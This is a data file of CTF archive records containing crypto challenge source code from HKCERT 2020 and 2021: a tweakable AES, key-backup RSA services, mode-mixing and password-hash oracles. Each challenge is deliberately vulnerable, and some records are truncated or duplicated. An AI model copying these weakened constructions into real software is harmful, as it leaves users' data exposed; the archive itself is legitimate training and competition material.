{"source": "ctf_archive", "path": "data\\ctf_archive\\hkcert2021-sratslla-sea\\server_files\\aes.py", "category": "crypto", "solution_code": "#!/usr/bin/env python\n\n\n\"\"\"\n    Copyright (C) 2012 Bo Zhu http://about.bozhu.me\n    Permission is hereby granted, free of charge, to any person obtaining a\n    copy of this software and associated documentation files (the \"Software\"),\n    to deal in the Software without restriction, including without limitation\n    the rights to use, copy, modify, merge, publish, distribute, sublicense,\n    and/or sell copies of the Software, and to permit persons to whom the\n    Software is furnished to do so, subject to the following conditions:\n    The above copyright notice and this permission notice shall be included in\n    all copies or substantial portions of the Software.\n    THE SOFTWARE IS PROVIDED \"AS IS\", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR\n    IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,\n    FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL\n    THE AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER\n    LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING\n    FROM, OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER\n    DEALINGS IN THE SOFTWARE.\n\n    Modified by Mystiz so that:\n    1. the code is now Python 3 compatible, and\n    2. the __add_round_key, __sub_bytes, __shift_rows, __mix_columns can be modified outside.\n\"\"\"\n\nSbox = (\n    0x63, 0x7C, 0x77, 0x7B, 0xF2, 0x6B, 0x6F, 0xC5, 0x30, 0x01, 0x67, 0x2B, 0xFE, 0xD7, 0xAB, 0x76,\n    0xCA, 0x82, 0xC9, 0x7D, 0xFA, 0x59, 0x47, 0xF0, 0xAD, 0xD4, 0xA2, 0xAF, 0x9C, 0xA4, 0x72, 0xC0,\n    0xB7, 0xFD, 0x93, 0x26, 0x36, 0x3F, 0xF7, 0xCC, 0x34, 0xA5, 0xE5, 0xF1, 0x71, 0xD8, 0x31, 0x15,\n    0x04, 0xC7, 0x23, 0xC3, 0x18, 0x96, 0x05, 0x9A, 0x07, 0x12, 0x80, 0xE2, 0xEB, 0x27, 0xB2, 0x75,\n    0x09, 0x83, 0x2C, 0x1A, 0x1B, 0x6E, 0x5A, 0xA0, 0x52, 0x3B, 0xD6, 0xB3, 0x29, 0xE3, 0x2F, 0x84,\n    0x53, 0xD1, 0x00, 0xED, 0x20, 0xFC, 0xB1, 0x5B, 0x6A, 0xCB, 0xBE, 0x39, 0x4A, 0x4C, 0x58, 0xCF,\n    0xD0, 0xEF, 0xAA, 0xFB, 0x43, 0x4D, 0x33, 0x85, 0x45, 0xF9, 0x02, 0x7F, 0x50, 0x3C, 0x9F, 0xA8,\n    0x51, 0xA3, 0x40, 0x8F, 0x92, 0x9D, 0x38, 0xF5, 0xBC, 0xB6, 0xDA, 0x21, 0x10, 0xFF, 0xF3, 0xD2,\n    0xCD, 0x0C, 0x13, 0xEC, 0x5F, 0x97, 0x44, 0x17, 0xC4, 0xA7, 0x7E, 0x3D, 0x64, 0x5D, 0x19, 0x73,\n    0x60, 0x81, 0x4F, 0xDC, 0x22, 0x2A, 0x90, 0x88, 0x46, 0xEE, 0xB8, 0x14, 0xDE, 0x5E, 0x0B, 0xDB,\n    0xE0, 0x32, 0x3A, 0x0A, 0x49, 0x06, 0x24, 0x5C, 0xC2, 0xD3, 0xAC, 0x62, 0x91, 0x95, 0xE4, 0x79,\n    0xE7, 0xC8, 0x37, 0x6D, 0x8D, 0xD5, 0x4E, 0xA9, 0x6C, 0x56, 0xF4, 0xEA, 0x65, 0x7A, 0xAE, 0x08,\n    0xBA, 0x78, 0x25, 0x2E, 0x1C, 0xA6, 0xB4, 0xC6, 0xE8, 0xDD, 0x74, 0x1F, 0x4B, 0xBD, 0x8B, 0x8A,\n    0x70, 0x3E, 0xB5, 0x66, 0x48, 0x03, 0xF6, 0x0E, 0x61, 0x35, 0x57, 0xB9, 0x86, 0xC1, 0x1D, 0x9E,\n    0xE1, 0xF8, 0x98, 0x11, 0x69, 0xD9, 0x8E, 0x94, 0x9B, 0x1E, 0x87, 0xE9, 0xCE, 0x55, 0x28, 0xDF,\n    0x8C, 0xA1, 0x89, 0x0D, 0xBF, 0xE6, 0x42, 0x68, 0x41, 0x99, 0x2D, 0x0F, 0xB0, 0x54, 0xBB, 0x16,\n)\n\nInvSbox = (\n    0x52, 0x09, 0x6A, 0xD5, 0x30, 0x36, 0xA5, 0x38, 0xBF, 0x40, 0xA3, 0x9E, 0x81, 0xF3, 0xD7, 0xFB,\n    0x7C, 0xE3, 0x39, 0x82, 0x9B, 0x2F, 0xFF, 0x87, 0x34, 0x8E, 0x43, 0x44, 0xC4, 0xDE, 0xE9, 0xCB,\n    0x54, 0x7B, 0x94, 0x32, 0xA6, 0xC2, 0x23, 0x3D, 0xEE, 0x4C, 0x95, 0x0B, 0x42, 0xFA, 0xC3, 0x4E,\n    0x08, 0x2E, 0xA1, 0x66, 0x28, 0xD9, 0x24, 0xB2, 0x76, 0x5B, 0xA2, 0x49, 0x6D, 0x8B, 0xD1, 0x25,\n    0x72, 0xF8, 0xF6, 0x64, 0x86, 0x68, 0x98, 0x16, 0xD4, 0xA4, 0x5C, 0xCC, 0x5D, 0x65, 0xB6, 0x92,\n    0x6C, 0x70, 0x48, 0x50, 0xFD, 0xED, 0xB9, 0xDA, 0x5E, 0x15, 0x46, 0x57, 0xA7, 0x8D, 0x9D, 0x84,\n    0x90, 0xD8, 0xAB, 0x00, 0x8C, 0xBC, 0xD3, 0x0A, 0xF7, 0xE4, 0x58, 0x05, 0xB8, 0xB3, 0x45, 0x06,\n    0xD0, 0x2C, 0x1E, 0x8F, 0xCA, 0x3F, 0x0F, 0x02, 0xC1, 0xAF, 0xBD, 0x03, 0x01, 0x13, 0x8A, 0x6B,\n    0x3A, 0x91, 0x11, 0x41, 0x4F, 0x67, 0xDC, 0xEA, 0x97, 0xF2, 0xCF, 0xCE, 0xF0, 0xB4, 0xE6, 0x73,\n    0x96, 0xAC, 0x74, 0x22, 0xE7, 0xAD, 0x35, 0x85, 0xE2, 0xF9, 0x37, 0xE8, 0x1C, 0x75, 0xDF, 0x6E,\n    0x47, 0xF1, 0x1A, 0x71, 0x1D, 0x29, 0xC5, 0x89, 0x6F, 0xB7, 0x62, 0x0E, 0xAA, 0x18, 0xBE, 0x1B,\n    0xFC, 0x56, 0x3E, 0x4B, 0xC6, 0xD2, 0x79, 0x20, 0x9A, 0xDB, 0xC0, 0xFE, 0x78, 0xCD, 0x5A, 0xF4,\n    0x1F, 0xDD, 0xA8, 0x33, 0x88, 0x07, 0xC7, 0x31, 0xB1, 0x12, 0x10, 0x59, 0x27, 0x80, 0xEC, 0x5F,\n    0x60, 0x51, 0x7F, 0xA9, 0x19, 0xB5, 0x4A, 0x0D, 0x2D, 0xE5, 0x7A, 0x9F, 0x93, 0xC9, 0x9C, 0xEF,\n    0xA0, 0xE0, 0x3B, 0x4D, 0xAE, 0x2A, 0xF5, 0xB0, 0xC8, 0xEB, 0xBB, 0x3C, 0x83, 0x53, 0x99, 0x61,\n    0x17, 0x2B, 0x04, 0x7E, 0xBA, 0x77, 0xD6, 0x26, 0xE1, 0x69, 0x14, 0x63, 0x55, 0x21, 0x0C, 0x7D,\n)\n\n\n# learnt from http://cs.ucsb.edu/~koc/cs178/projects/JT/aes.c\nxtime = lambda a: (((a << 1) ^ 0x1B) & 0xFF) if (a & 0x80) else (a << 1)\n\n\nRcon = (\n    0x00, 0x01, 0x02, 0x04, 0x08, 0x10, 0x20, 0x40,\n    0x80, 0x1B, 0x36, 0x6C, 0xD8, 0xAB, 0x4D, 0x9A,\n    0x2F, 0x5E, 0xBC, 0x63, 0xC6, 0x97, 0x35, 0x6A,\n    0xD4, 0xB3, 0x7D, 0xFA, 0xEF, 0xC5, 0x91, 0x39,\n)\n\n\ndef text2matrix(text):\n    text = int.from_bytes(text, 'big')\n    matrix ", "name": "aes"}
{"source": "ctf_archive", "path": "data\\ctf_archive\\hkcert2021-sratslla-sea\\server_files\\chall.py", "category": "crypto", "solution_code": "import os\nfrom aes import AES\nimport hashlib\n\n# A function that does nothing\nno_op = lambda *x: None\n\ndef main():    \n    k = os.urandom(16)\n    cipher = AES(k)\n    secret = b''.join(k[i:i+1]*4 for i in range(16))\n\n    flag = os.environ.get('FLAG', 'hkcert21{***********************REDACTED***********************}').encode()\n    assert len(flag) == 64\n\n    flag = b''.join([cipher.encrypt(flag[i:i+16]) for i in range(0, 64, 16)])\n    print(f'Hey. This is the encrypted flag you gotta decrypt: {flag.hex()}.')\n\n    options = ['ark', 'sb', 'sr', 'mc']\n    suboptions = ['data', 'secret']\n    \n    for _ in range(128):\n        [option, suboption, *more] = input('> ').split(' ')\n        if option not in options: raise Exception('invalid option!')\n        if suboption not in suboptions: raise Exception('invalid suboption!')\n        \n        if suboption == 'secret':\n            options.remove(option)\n            message = secret\n        else:\n            message = bytes.fromhex(more[0])\n            if len(message) != 16: raise Exception('invalid length!')\n            message = message * 4\n\n        if option == 'ark':\n            # Stage 1: \"AddRoundKey\" does nothing\n            cipher = AES(k)\n            cipher._add_round_key = no_op\n            ciphertext = cipher.encrypt(message[0:16])\n        elif option == 'sb':\n            # Stage 2: \"SubBytes\" does nothing\n            cipher = AES(k)\n            cipher._sub_bytes = no_op\n            ciphertext = cipher.encrypt(message[16:32])\n        elif option == 'sr':\n            # Stage 3: \"ShiftRows\" does nothing\n            cipher = AES(k)\n            cipher._shift_rows = no_op\n            ciphertext = cipher.encrypt(message[32:48])\n        elif option == 'mc':\n            # Stage 4: \"MixColumns\" does nothing\n            cipher = AES(k)\n            cipher._mix_columns = no_op\n            ciphertext = cipher.encrypt(message[48:64])\n\n        print(ciphertext.hex())\n\nif __name__ == '__main__':\n    main()\n\n", "name": "chall"}
{"source": "ctf_archive", "path": "data\\ctf_archive\\hkcert2021-sign-in-please-again\\release_files\\chall.py", "category": "crypto", "solution_code": "import base64\nimport hashlib\nimport os\nimport random\nimport signal\n\n\ndef parse_pbox(payload):\n    return list(map(int, payload[1:-1].split(',')))\n\n\ndef permutate(payload, pbox):\n    return bytes([payload[x] for x in pbox])\n\n\nclass Server:\n    def __init__(self, password):\n        assert len(password) == 16\n        self.password = password\n\n    def preauth(self):\n        pbox = list(range(21))\n        salt = os.urandom(4)\n        random.shuffle(pbox)\n        return pbox, salt\n\n    def auth(self, pbox, salt, hashed_password):\n        for pepper_int in range(256):\n            pepper = bytes([pepper_int])\n            permutated_password = permutate(self.password + salt + pepper, pbox)\n            if hashlib.sha256(permutated_password).hexdigest() != hashed_password: continue\n            return True\n        return False\n\n\nclass Client:\n    def __init__(self, password):\n        self.password = password\n\n    def spy(self, pbox, salt):\n        assert set(pbox) == set(range(21))\n        assert len(salt) == 4\n        password = self.password\n        pepper = os.urandom(1)\n        permutated_password = permutate(password + salt + pepper, pbox)\n\n        hashed_password = hashlib.sha256(permutated_password).hexdigest()\n        print(f'ðŸ”‘ {hashed_password}')\n\n\ndef work():\n    challenge = os.urandom(8)\n    print(f'ðŸ”§ {base64.b64encode(challenge).decode()}')\n    response = base64.b64decode(input('ðŸ”© '))\n    h = hashlib.sha256(challenge + response).digest()\n    return h.startswith(b'\\x00\\x00\\x00')\n\ndef main():\n    flag = os.environ.get('FLAG', 'hkcert21{***REDACTED***}')\n    \n    signal.alarm(60)\n    password = base64.b64encode(os.urandom(12))\n\n    s = Server(password)\n    c = Client(password)\n\n    for _ in range(50):\n        command = input('ðŸ¤– ')\n        try:\n            if command == 'ðŸ•µï¸':\n                pbox = parse_pbox(input('ðŸ˜µ '))\n                salt = base64.b64decode(input('ðŸ§‚ '))\n                c.spy(pbox, salt)\n            elif command == 'ðŸ–¥ï¸':\n                pbox, salt = s.preauth()\n                print(f'ðŸ˜µ {pbox}')\n                print(f'ðŸ§‚ {base64.b64encode(salt).decode()}')\n                hashed_password = input('ðŸ”‘ ')\n                if not s.auth(pbox, salt, hashed_password):\n                    raise Exception('No!')\n                print(f'ðŸ {flag}')\n        except:\n            print('ðŸ˜¡')\n\n\nif __name__ == '__main__':\n    if work():\n        main()\n    else:\n        print('ðŸ˜¡')\n", "name": "chall"}
{"source": "ctf_archive", "path": "data\\ctf_archive\\hkcert2021-sign-in-please-again\\server_files\\chall.py", "category": "crypto", "solution_code": "import base64\nimport hashlib\nimport os\nimport random\nimport signal\n\n\ndef parse_pbox(payload):\n    return list(map(int, payload[1:-1].split(',')))\n\n\ndef permutate(payload, pbox):\n    return bytes([payload[x] for x in pbox])\n\n\nclass Server:\n    def __init__(self, password):\n        assert len(password) == 16\n        self.password = password\n\n    def preauth(self):\n        pbox = list(range(21))\n        salt = os.urandom(4)\n        random.shuffle(pbox)\n        return pbox, salt\n\n    def auth(self, pbox, salt, hashed_password):\n        for pepper_int in range(256):\n            pepper = bytes([pepper_int])\n            permutated_password = permutate(self.password + salt + pepper, pbox)\n            if hashlib.sha256(permutated_password).hexdigest() != hashed_password: continue\n            return True\n        return False\n\n\nclass Client:\n    def __init__(self, password):\n        self.password = password\n\n    def spy(self, pbox, salt):\n        assert set(pbox) == set(range(21))\n        assert len(salt) == 4\n        password = self.password\n        pepper = os.urandom(1)\n        permutated_password = permutate(password + salt + pepper, pbox)\n\n        hashed_password = hashlib.sha256(permutated_password).hexdigest()\n        print(f'ðŸ”‘ {hashed_password}')\n\n\ndef work():\n    challenge = os.urandom(8)\n    print(f'ðŸ”§ {base64.b64encode(challenge).decode()}')\n    response = base64.b64decode(input('ðŸ”© '))\n    h = hashlib.sha256(challenge + response).digest()\n    return h.startswith(b'\\x00\\x00\\x00')\n\ndef main():\n    flag = os.environ.get('FLAG', 'hkcert21{***REDACTED***}')\n    \n    signal.alarm(60)\n    password = base64.b64encode(os.urandom(12))\n\n    s = Server(password)\n    c = Client(password)\n\n    for _ in range(50):\n        command = input('ðŸ¤– ')\n        try:\n            if command == 'ðŸ•µï¸':\n                pbox = parse_pbox(input('ðŸ˜µ '))\n                salt = base64.b64decode(input('ðŸ§‚ '))\n                c.spy(pbox, salt)\n            elif command == 'ðŸ–¥ï¸':\n                pbox, salt = s.preauth()\n                print(f'ðŸ˜µ {pbox}')\n                print(f'ðŸ§‚ {base64.b64encode(salt).decode()}')\n                hashed_password = input('ðŸ”‘ ')\n                if not s.auth(pbox, salt, hashed_password):\n                    raise Exception('No!')\n                print(f'ðŸ {flag}')\n        except:\n            print('ðŸ˜¡')\n\n\nif __name__ == '__main__':\n    if work():\n        main()\n    else:\n        print('ðŸ˜¡')\n", "name": "chall"}
{"source": "ctf_archive", "path": "data\\ctf_archive\\hkcert2021-key-backup-service-2\\release_files\\chall.py", "category": "crypto", "solution_code": "import os\nimport random\nfrom Crypto.Cipher import AES\nfrom Crypto.Util.number import isPrime as is_prime\nfrom Crypto.Util.Padding import pad\n\n# 256 bits for random-number generator\nN = 0xcdc21452d0d82fbce447a874969ebb70bcc41a2199fbe74a2958d0d280000001\nG = 0x5191654c7d85905266b0a88aea88f94172292944674b97630853f919eeb1a070\nH = 0x7468657365206e756d6265727320617265206f6620636f757273652073757321\n\n# More challenge-specific parameters\nE     = 65537 # The public modulus\nCALLS = 65537 # The number of operations allowed\n\n# Generate a 512-bit prime\ndef generate_prime(seed):\n    random.seed(seed)\n    while True:\n        p = random.getrandbits(512) | (1<<511)\n        if p % E == 1: continue\n        if not is_prime(p): continue\n        return p\n\n# Defines a 1024-bit RSA key\nclass Key:\n    def __init__(self, p, q):\n        self.p = p\n        self.q = q\n        self.n = p*q\n        self.e = E\n        phi = (p-1) * (q-1)\n        self.d = pow(self.e, -1, phi)\n\n    def encrypt(self, m):\n        return pow(m, self.e, self.n)\n    \n    def decrypt(self, c):\n        return pow(c, self.d, self.n)\n\n# Defines an user\nclass User:\n    def __init__(self, master_secret):\n        self.master_secret = master_secret\n        self.key = None\n\n    def generate_key(self):\n        id = random.getrandbits(256)\n        self.key = Key(\n            generate_prime(self.master_secret + int.to_bytes(pow(G, id, N), 32, 'big')),\n            generate_prime(self.master_secret + int.to_bytes(pow(H, id, N), 32, 'big'))\n        )\n    \n    def send(self, m):\n        if self.key is None: raise Exception('no key is defined!')\n\n        m = int(m, 16)\n        print(hex(self.key.encrypt(m)))\n    \n    def get_secret(self):\n        if self.key is None: raise Exception('no key is defined!')\n\n        m = int.from_bytes(self.master_secret, 'big')\n        print(hex(self.key.encrypt(m)))\n\n\ndef main():\n    flag = os.environ.get('FLAG', 'hkcert21{***REDACTED***}')\n    flag = pad(flag.encode(), 16)\n\n    master_secret = os.urandom(32)\n    admin = User(master_secret)\n\n    for _ in range(CALLS):\n        command = input('[cmd] ').split(' ')\n\n        try:\n            if command[0] == 'send':\n                # Encrypts a hexed message\n                admin.send(command[1])\n            elif command[0] == 'pkey':\n                # Refreshs a new set of key\n                admin.generate_key()\n            elif command[0] == 'backup':\n                # Gets the encrypted master secret\n                admin.get_secret()\n            elif command[0] == 'flag':\n                cipher = AES.new(master_secret, AES.MODE_CBC, b'\\0'*16)\n                encrypted_flag = cipher.encrypt(flag)\n                print(encrypted_flag.hex())\n        except Exception as err:\n            raise err\n            print('nope')\n\nif __name__ == '__main__':\n    main()\n\n'''\nSide-note: I knew this is _very_ similar to \"Long Story Short\" in HKCERT CTF 2021, but rest assured that this is a different challenge.\n...:)\n'''\n", "name": "chall"}
{"source": "ctf_archive", "path": "data\\ctf_archive\\hkcert2021-key-backup-service-1\\release_files\\chall.py", "category": "crypto", "solution_code": "import os\nimport random\nfrom Crypto.Cipher import AES\nfrom Crypto.Util.number import isPrime as is_prime\nfrom Crypto.Util.Padding import pad\n\n# 256 bits for random-number generator\nN = 0xcdc21452d0d82fbce447a874969ebb70bcc41a2199fbe74a2958d0d280000001\nG = 0x5191654c7d85905266b0a88aea88f94172292944674b97630853f919eeb1a070\nH = 0x7468657365206e756d6265727320617265206f6620636f757273652073757321\n\n# More challenge-specific parameters\nE     = 17    # The public modulus\nCALLS = 17    # The number of operations allowed\n\n# Generate a 512-bit prime\ndef generate_prime(seed):\n    random.seed(seed)\n    while True:\n        p = random.getrandbits(512) | (1<<511)\n        if p % E == 1: continue\n        if not is_prime(p): continue\n        return p\n\n# Defines a 1024-bit RSA key\nclass Key:\n    def __init__(self, p, q):\n        self.p = p\n        self.q = q\n        self.n = p*q\n        self.e = E\n        phi = (p-1) * (q-1)\n        self.d = pow(self.e, -1, phi)\n\n    def encrypt(self, m):\n        return pow(m, self.e, self.n)\n    \n    def decrypt(self, c):\n        return pow(c, self.d, self.n)\n\n# Defines an user\nclass User:\n    def __init__(self, master_secret):\n        self.master_secret = master_secret\n        self.key = None\n\n    def generate_key(self):\n        id = random.getrandbits(256)\n        self.key = Key(\n            generate_prime(self.master_secret + int.to_bytes(pow(G, id, N), 32, 'big')),\n            generate_prime(self.master_secret + int.to_bytes(pow(H, id, N), 32, 'big'))\n        )\n    \n    def send(self, m):\n        if self.key is None: raise Exception('no key is defined!')\n\n        m = int(m, 16)\n        print(hex(self.key.encrypt(m)))\n    \n    def get_secret(self):\n        if self.key is None: raise Exception('no key is defined!')\n\n        m = int.from_bytes(self.master_secret, 'big')\n        print(hex(self.key.encrypt(m)))\n\n\ndef main():\n    flag = os.environ.get('FLAG', 'hkcert21{***REDACTED***}')\n    flag = pad(flag.encode(), 16)\n\n    master_secret = os.urandom(32)\n    admin = User(master_secret)\n\n    for _ in range(CALLS):\n        command = input('[cmd] ').split(' ')\n\n        try:\n            if command[0] == 'send':\n                # Encrypts a hexed message\n                admin.send(command[1])\n            elif command[0] == 'pkey':\n                # Refreshs a new set of key\n                admin.generate_key()\n            elif command[0] == 'backup':\n                # Gets the encrypted master secret\n                admin.get_secret()\n            elif command[0] == 'flag':\n                cipher = AES.new(master_secret, AES.MODE_CBC, b'\\0'*16)\n                encrypted_flag = cipher.encrypt(flag)\n                print(encrypted_flag.hex())\n        except Exception as err:\n            raise err\n            print('nope')\n\nif __name__ == '__main__':\n    main()\n\n'''\nSide-note: I knew this is _very_ similar to \"Calm Down\" in HKCERT CTF 2020, but rest assured that this is a different challenge.\nhttps://github.com/samueltangz/ctf-archive-created/blob/master/20201006-hkcert-ctf/calm-down/env/chall.py\n'''\n", "name": "chall"}
{"source": "ctf_archive", "path": "data\\ctf_archive\\hkcert2021-key-backup-service-1\\server_files\\chall.py", "category": "crypto", "solution_code": "import os\nimport random\nfrom Crypto.Cipher import AES\nfrom Crypto.Util.number import isPrime as is_prime\nfrom Crypto.Util.Padding import pad\n\n# 256 bits for random-number generator\nN = 0xcdc21452d0d82fbce447a874969ebb70bcc41a2199fbe74a2958d0d280000001\nG = 0x5191654c7d85905266b0a88aea88f94172292944674b97630853f919eeb1a070\nH = 0x7468657365206e756d6265727320617265206f6620636f757273652073757321\n\n# More challenge-specific parameters\nE     = 17    # The public modulus\nCALLS = 17    # The number of operations allowed\n\n# Generate a 512-bit prime\ndef generate_prime(seed):\n    random.seed(seed)\n    while True:\n        p = random.getrandbits(512) | (1<<511)\n        if p % E == 1: continue\n        if not is_prime(p): continue\n        return p\n\n# Defines a 1024-bit RSA key\nclass Key:\n    def __init__(self, p, q):\n        self.p = p\n        self.q = q\n        self.n = p*q\n        self.e = E\n        phi = (p-1) * (q-1)\n        self.d = pow(self.e, -1, phi)\n\n    def encrypt(self, m):\n        return pow(m, self.e, self.n)\n    \n    def decrypt(self, c):\n        return pow(c, self.d, self.n)\n\n# Defines an user\nclass User:\n    def __init__(self, master_secret):\n        self.master_secret = master_secret\n        self.key = None\n\n    def generate_key(self):\n        id = random.getrandbits(256)\n        self.key = Key(\n            generate_prime(self.master_secret + int.to_bytes(pow(G, id, N), 32, 'big')),\n            generate_prime(self.master_secret + int.to_bytes(pow(H, id, N), 32, 'big'))\n        )\n    \n    def send(self, m):\n        if self.key is None: raise Exception('no key is defined!')\n\n        m = int(m, 16)\n        print(hex(self.key.encrypt(m)))\n    \n    def get_secret(self):\n        if self.key is None: raise Exception('no key is defined!')\n\n        m = int.from_bytes(self.master_secret, 'big')\n        print(hex(self.key.encrypt(m)))\n\n\ndef main():\n    flag = os.environ.get('FLAG', 'hkcert21{***REDACTED***}')\n    flag = pad(flag.encode(), 16)\n\n    master_secret = os.urandom(32)\n    admin = User(master_secret)\n\n    for _ in range(CALLS):\n        command = input('[cmd] ').split(' ')\n\n        try:\n            if command[0] == 'send':\n                # Encrypts a hexed message\n                admin.send(command[1])\n            elif command[0] == 'pkey':\n                # Refreshs a new set of key\n                admin.generate_key()\n            elif command[0] == 'backup':\n                # Gets the encrypted master secret\n                admin.get_secret()\n            elif command[0] == 'flag':\n                cipher = AES.new(master_secret, AES.MODE_CBC, b'\\0'*16)\n                encrypted_flag = cipher.encrypt(flag)\n                print(encrypted_flag.hex())\n        except Exception as err:\n            raise err\n            print('nope')\n\nif __name__ == '__main__':\n    main()\n\n'''\nSide-note: I knew this is _very_ similar to \"Calm Down\" in HKCERT CTF 2020, but rest assured that this is a different challenge.\nhttps://github.com/samueltangz/ctf-archive-created/blob/master/20201006-hkcert-ctf/calm-down/env/chall.py\n'''\n", "name": "chall"}
{"source": "ctf_archive", "path": "data\\ctf_archive\\hkcert2021-freedom\\release_files\\chall.py", "category": "crypto", "solution_code": "import os\nfrom Crypto.Cipher import AES\nfrom Crypto.Util import Counter\n\ndef main():\n    flag = os.environ.get('FLAG', 'hkcert21{*******************************REDACTED*******************************}')\n    flag = flag.encode()\n    assert len(flag) == 80\n\n    key = os.urandom(16)\n    iv = os.urandom(16)\n\n    options = ['ecb', 'cbc', 'cfb', 'ofb', 'ctr']\n    suboptions = ['data', 'flag']\n    \n    for _ in range(5):\n        [option, suboption, *more] = input('> ').split(' ')\n        if option not in options: raise Exception('invalid option!')\n        if suboption not in suboptions: raise Exception('invalid suboption!')\n        options.remove(option)\n\n        if suboption == 'data':\n            message = bytes.fromhex(more[0])\n        else:\n            message = flag\n        \n        if option == 'ecb':   cipher = AES.new(key, AES.MODE_ECB)\n        elif option == 'cbc': cipher = AES.new(key, AES.MODE_CBC, iv)\n        elif option == 'cfb': cipher = AES.new(key, AES.MODE_CFB, iv, segment_size=128)\n        elif option == 'ofb': cipher = AES.new(key, AES.MODE_OFB, iv)\n        elif option == 'ctr': cipher = AES.new(key, AES.MODE_CTR, counter=Counter.new(16, prefix=iv[:14]))\n\n        ciphertext = cipher.encrypt(message)\n        print(ciphertext.hex())\n    else:\n        print('Bye!')\n\nif __name__ == '__main__':\n    main()\n", "name": "chall"}
{"source": "ctf_archive", "path": "data\\ctf_archive\\hkcert2021-freedom\\server_files\\chall.py", "category": "crypto", "solution_code": "import os\nfrom Crypto.Cipher import AES\nfrom Crypto.Util import Counter\n\ndef main():\n    flag = os.environ.get('FLAG', 'hkcert21{*******************************REDACTED*******************************}')\n    flag = flag.encode()\n    assert len(flag) == 80\n\n    key = os.urandom(16)\n    iv = os.urandom(16)\n\n    options = ['ecb', 'cbc', 'cfb', 'ofb', 'ctr']\n    suboptions = ['data', 'flag']\n    \n    for _ in range(5):\n        [option, suboption, *more] = input('> ').split(' ')\n        if option not in options: raise Exception('invalid option!')\n        if suboption not in suboptions: raise Exception('invalid suboption!')\n        options.remove(option)\n\n        if suboption == 'data':\n            message = bytes.fromhex(more[0])\n        else:\n            message = flag\n        \n        if option == 'ecb':   cipher = AES.new(key, AES.MODE_ECB)\n        elif option == 'cbc': cipher = AES.new(key, AES.MODE_CBC, iv)\n        elif option == 'cfb': cipher = AES.new(key, AES.MODE_CFB, iv, segment_size=128)\n        elif option == 'ofb': cipher = AES.new(key, AES.MODE_OFB, iv)\n        elif option == 'ctr': cipher = AES.new(key, AES.MODE_CTR, counter=Counter.new(16, prefix=iv[:14]))\n\n        ciphertext = cipher.encrypt(message)\n        print(ciphertext.hex())\n    else:\n        print('Bye!')\n\nif __name__ == '__main__':\n    main()\n", "name": "chall"}
{"source": "ctf_archive", "path": "data\\ctf_archive\\hkcert2021-a-joke-cipher\\release_files\\chall.py", "category": "crypto", "solution_code": "import random\nfrom Crypto.Util.number import getPrime as get_prime\n\n# https://link.springer.com/content/pdf/10.1007/s42452-019-1928-8.pdf\nclass NagatyCryptosystem:\n    def __init__(self, p=None):\n        # Section 3.1\n        # \"Select a very large prime number p.\"\n        self.p = get_prime(1024) if p is None else p\n        \n        # Generate 1024 numbers as the sequence\n        u = [random.getrandbits(1024) for _ in range(1024)]\n\n        self.private_key = sum(u)\n        self.public_key  = self.private_key % self.p\n\n        self.shared_key = None\n\n    def start_exchange(self):\n        return (self.public_key, self.p)\n\n    def exchange(self, y_B):\n        S_A = self.private_key\n        y_A = self.public_key\n\n        y_AB = y_A * y_B\n        S_AB = (y_AB * y_B) * S_A % self.p\n\n        self.shared_key = S_AB\n\n    def encrypt(self, m):\n        sk = self.shared_key\n        if sk is None: raise Exception('Key exchange is not completed')\n\n        return m * sk\n    \n    def decrypt(self, c):\n        sk = self.shared_key\n        if sk is None: raise Exception('Key exchange is not completed')\n\n        return c // sk\n\n\n# Sanity test\ndef test():\n    cipher_alice = NagatyCryptosystem()\n    alice_public_key, p = cipher_alice.start_exchange()\n\n    cipher_bob = NagatyCryptosystem(p)\n    bob_public_key, _ = cipher_bob.start_exchange()\n\n    cipher_alice.exchange(bob_public_key)\n    cipher_bob.exchange(alice_public_key)\n\n    # Test: Alice sends a message to Bob and Bob is able to decrypt it\n    m = 1337\n    c = cipher_alice.encrypt(m)\n    assert cipher_bob.decrypt(c) == m\n\n    # Test: Bob sends a message to Alice and Alice is able to decrypt it\n    m = 1337\n    c = cipher_bob.encrypt(m)\n    assert cipher_alice.decrypt(c) == m\n\ndef main():\n    # Reads the flag and converts the string into a number\n    with open('flag.txt', 'rb') as f: flag = f.read()\n    flag = int.from_bytes(flag, 'big')\n\n    cipher_alice = NagatyCryptosystem()\n    alice_public_key, p = cipher_alice.start_exchange()\n\n    cipher_bob = NagatyCryptosystem(p)\n    bob_public_key, _ = cipher_bob.start_exchange()\n\n    cipher_alice.exchange(bob_public_key)\n    cipher_bob.exchange(alice_public_key)\n\n    c = cipher_alice.encrypt(flag)\n    \n    print('p =', hex(p))\n    print('y_A =', hex(alice_public_key))\n    print('y_B =', hex(bob_public_key))\n    print('c =', hex(c))\n\nif __name__ == '__main__':\n    test()\n    main()", "name": "chall"}
{"source": "ctf_archive", "path": "data\\ctf_archive\\hkcert2020-sign-in-please\\release_files\\chall.py", "category": "crypto", "solution_code": "import base64\nimport hashlib\nimport os\nimport random\n\ndef parse_pbox(payload):\n    return list(map(int, payload[1:-1].split(',')))\n\n\ndef permutate(payload, pbox):\n    return bytes([payload[x] for x in pbox])\n\n\nclass Server:\n    def __init__(self, password):\n        assert len(password) == 16\n        self.password = password\n\n    def preauth(self):\n        pbox = list(range(20))\n        salt = os.urandom(4)\n        random.shuffle(pbox)\n        return pbox, salt\n\n    def auth(self, pbox, salt, hashed_password):\n        permutated_password = permutate(self.password + salt, pbox)\n        return hashlib.sha256(permutated_password).hexdigest() == hashed_password\n\n\nclass Client:\n    def __init__(self, password):\n        self.password = password\n\n    def spy(self, pbox, salt):\n        assert len(set(pbox)) == 20\n        assert len(salt) == 4\n        password = self.password\n        permutated_password = permutate(password + salt, pbox)\n\n        hashed_password = hashlib.sha256(permutated_password).hexdigest()\n        print(f'[hash] {hashed_password}')\n\n\ndef main():\n    password = base64.b64encode(os.urandom(12))\n    flag = os.environ.get('FLAG', 'hkcert20{***REDACTED***}')\n\n    s = Server(password)\n    c = Client(password)\n\n    for _ in range(10):\n        command = input('[cmd] ')\n        try:\n            if command == 'spy':\n                pbox = parse_pbox(input('[pbox] '))\n                salt = base64.b64decode(input('[salt] '))\n                c.spy(pbox, salt)\n            elif command == 